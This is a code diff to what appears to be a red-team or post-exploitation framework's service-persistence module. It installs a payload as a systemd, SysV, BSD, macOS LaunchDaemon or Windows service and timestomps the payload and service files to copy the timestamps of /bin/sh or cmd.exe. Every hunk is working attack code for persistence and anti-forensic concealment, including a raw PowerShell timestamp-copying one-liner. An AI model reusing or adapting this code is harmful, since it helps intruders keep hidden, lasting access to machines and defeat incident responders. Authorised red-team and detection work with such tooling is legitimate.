@@ -253,9 +253,8 @@ def systemd(service_name, service_desc, executable_path, executable_args):
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
     sys.shell("chmod +x "+executable_path)
-    sys.shell(f"touch -r /bin/sh {executable_path}")
-    sys.shell(
-        f"touch -r /bin/sh /usr/lib/systemd/system/{service_name}.service")
+    file.timestomp(executable_path, ref_file="/bin/sh")
+    file.timestomp(systemd_dir+service_name+".service", ref_file="/bin/sh")
 
     sys.shell("systemctl daemon-reload "+service_name)
     sys.shell("systemctl enable "+service_name)
@@ -277,8 +276,8 @@ def sysvinit(service_name, service_desc, executable_path, executable_args):
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
     sys.shell("chmod +x "+executable_path)
-    sys.shell(f"touch -r /bin/sh {executable_path}")
-    sys.shell(f"touch -r /bin/sh /etc/init.d/{service_name}")
+    file.timestomp(executable_path, ref_file="/bin/sh")
+    file.timestomp("/etc/init.d/"+service_name, ref_file="/bin/sh")
 
     sys.shell("update-rc.d "+service_name+" defaults")
     sys.shell("service "+service_name+" start")
@@ -303,6 +302,8 @@ def bsdinit(service_name, service_desc, executable_path, executable_args):
 
     sys.shell("chmod +x "+startup_dir+service_name+".sh")
     sys.shell("chmod +x "+executable_path)
+    file.timestomp(executable_path, ref_file="/bin/sh")
+    file.timestomp(startup_dir+service_name+".sh", ref_file="/bin/sh")
     sys.shell("service "+service_name+".sh start")
 
     print("bsdinit installed")
@@ -322,6 +323,8 @@ def launch_daemon(service_name, executable_path, executable_args):
 
     # assets.copy("persist_service/files/payload.macho", executable_path)
     sys.shell("chmod +x "+executable_path)
+    file.timestomp(executable_path, ref_file="/bin/sh")
+    file.timestomp("/Library/LaunchDaemons/"+service_name+".plist", ref_file="/bin/sh")
     sys.shell("launchctl load -w /Library/LaunchDaemons/"+service_name+".plist")
     print("Launch daemon installed")
 
@@ -365,7 +368,7 @@ def persist_service(service_name, service_desc, executable_path, executable_args
         launch_daemon(service_name, executable_path, executable_args)
     elif sys.is_windows():
         file.copy(src_path, executable_path)
-        sys.shell(f"""powershell /c "\$src = Get-Item 'C:\\Windows\\System32\\cmd.exe'; \$tgt = Get-Item '{executable_path}'; $tgt.CreationTime = $src.CreationTime; $tgt.LastWriteTime = $src.LastWriteTime; $tgt.LastAccessTime = $src.LastAccessTime" """)
+        file.timestomp(executable_path, ref_file="C:\\Windows\\System32\\cmd.exe")
         windows_service_manager(
             service_name, windows_display_name, service_desc, executable_path, executable_args)
     elif sys.get_os()['platform'] == "PLATFORM_BSD":
